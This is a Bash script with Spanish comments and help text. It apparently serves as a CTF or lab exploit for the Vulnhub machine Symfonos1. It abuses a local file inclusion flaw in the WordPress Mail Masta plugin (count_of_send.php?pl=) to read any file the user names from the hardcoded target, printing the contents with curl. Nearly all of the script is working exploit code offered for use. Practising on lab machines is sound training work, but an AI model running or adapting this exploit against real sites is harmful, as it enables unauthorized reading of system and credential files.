#!/bin/bash

function ctrl_c(){
	echo -e "\n\n[!]Saliendo...\n"
tput cnorm; exit 1;
}

function fileRead(){
	echo -e "[!]Voy a leer el archivo $1:\n"
	petition=$(curl -s -X GET "http://symfonos.local/h3l105//wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=$1")
	if [ ! -z "$petition" ]; then
	  curl -s -X GET "http://symfonos.local/h3l105//wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=$1" #hago la peticion otra vez porque por alguna razon guardarla en una variable la formatea y se ve sin saltos de linea
	else
	  echo -e "[!]No se ha recibido nada!" # esta comparacion de si la cadena está vacia se debe a que curl devuelve ante los 2 casos salida 0 porque lapetición se ha tramitado correctamente por symfonos1
	fi
}

function helpPanel(){

	echo -e "\n\n[!]Funcionamiento: script -f direccionArchivoAleer\nLa direccion del lfi está hardcodeada y corresponde a un exploit muy específico de la máquina de vulnhub symfonos1"
	echo -e "\n[!!!!!]Se podría mejorar el hacer un case para -F y que al pasarle un archivo, lo leyera y ejecutara un curl por cada línea de archivo\n Tambien colorines, facil de hacer pero me daba pereza"
}

tput civis
trap ctrl_c INT

parameter_counter=0
#sleep 10

#creacion de menu con getopts
while getopts "hf:" arg; do  #cuando quieras argumento le pones : sino no le pones nada
	case $arg in
	  h) ;;
	  f) filename=$OPTARG; let parameter_counter+=1;;
	esac
done

if [ $parameter_counter -eq '1' ]; then
	fileRead $filename
else
	helpPanel
fi
tput cnorm; exit 0
#las sentencias tienen que terminar en doble ;;
#optarg es sintaxis de getops, corresponde al parametro pasado a f con getops
